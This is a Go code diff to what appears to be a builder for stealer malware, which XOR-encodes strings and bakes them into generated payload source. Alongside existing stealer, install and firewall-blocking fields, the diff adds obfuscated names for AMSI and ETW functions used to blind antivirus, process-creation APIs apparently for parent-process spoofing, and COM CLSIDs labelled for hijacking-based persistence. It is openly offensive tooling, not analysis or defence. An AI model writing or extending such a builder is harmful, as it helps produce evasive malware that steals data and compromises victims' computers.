@@ -203,6 +203,18 @@ type globalValues struct {
 	EncStealerFileNames      string
 	EncInstallStrings        string
 	EncFirewallParts         string
+
+	EncAmsiDll               string
+	EncAmsiScanBuffer        string
+	EncVirtualProtect        string
+	EncEtwEventWrite         string
+	EncSetConsoleTitleW      string
+	EncCreateProcessW        string
+	EncOpenProcessName       string
+	EncInitProcAttrList      string
+	EncUpdateProcAttr        string
+	EncDeleteProcAttrList    string
+	EncCOMHijackCLSIDs       string
 }
 
 var disguiseNames = []string{
@@ -660,6 +672,22 @@ func buildGlobals(cfg Config) (globalValues, error) {
 			"action=block",
 			" Service",
 		}, key),
+
+		EncAmsiDll:            xorWithKey("amsi.dll", key),
+		EncAmsiScanBuffer:     xorWithKey("AmsiScanBuffer", key),
+		EncVirtualProtect:     xorWithKey("VirtualProtect", key),
+		EncEtwEventWrite:      xorWithKey("EtwEventWrite", key),
+		EncSetConsoleTitleW:   xorWithKey("SetConsoleTitleW", key),
+		EncCreateProcessW:     xorWithKey("CreateProcessW", key),
+		EncOpenProcessName:    xorWithKey("OpenProcess", key),
+		EncInitProcAttrList:   xorWithKey("InitializeProcThreadAttributeList", key),
+		EncUpdateProcAttr:     xorWithKey("UpdateProcThreadAttribute", key),
+		EncDeleteProcAttrList: xorWithKey("DeleteProcThreadAttributeList", key),
+		EncCOMHijackCLSIDs: xorListWithKey([]string{
+			"{BCDE0395-E52F-467C-8E3D-C4579291692E}",
+			"{AB8902B4-09CA-4BB6-B78D-A8F59079A8D5}",
+			"{C6BF6832-1E04-46D9-BA4C-3E553A704BE1}",
+		}, key),
 	}, nil
 }
 
@@ -874,6 +902,18 @@ var encStealerFileNames = "%s"
 var encInstallStrings = "%s"
 var encFirewallParts = "%s"
 
+var encAmsiDll = "%s"
+var encAmsiScanBufferName = "%s"
+var encVirtualProtectName = "%s"
+var encEtwEventWriteName = "%s"
+var encSetConsoleTitleWName = "%s"
+var encCreateProcessWName = "%s"
+var encOpenProcessName = "%s"
+var encInitProcAttrListName = "%s"
+var encUpdateProcAttrName = "%s"
+var encDeleteProcAttrListName = "%s"
+var encCOMHijackCLSIDs = "%s"
+
 var decryptionKey = []byte("%s")
 `,
 		escapeGoString(g.ForceAdmin),
@@ -1068,6 +1108,18 @@ var decryptionKey = []byte("%s")
 		g.EncStealerFileNames,
 		g.EncInstallStrings,
 		g.EncFirewallParts,
+
+		g.EncAmsiDll,
+		g.EncAmsiScanBuffer,
+		g.EncVirtualProtect,
+		g.EncEtwEventWrite,
+		g.EncSetConsoleTitleW,
+		g.EncCreateProcessW,
+		g.EncOpenProcessName,
+		g.EncInitProcAttrList,
+		g.EncUpdateProcAttr,
+		g.EncDeleteProcAttrList,
+		g.EncCOMHijackCLSIDs,
 
 		g.XorKeyLiteral,
 	)), nil
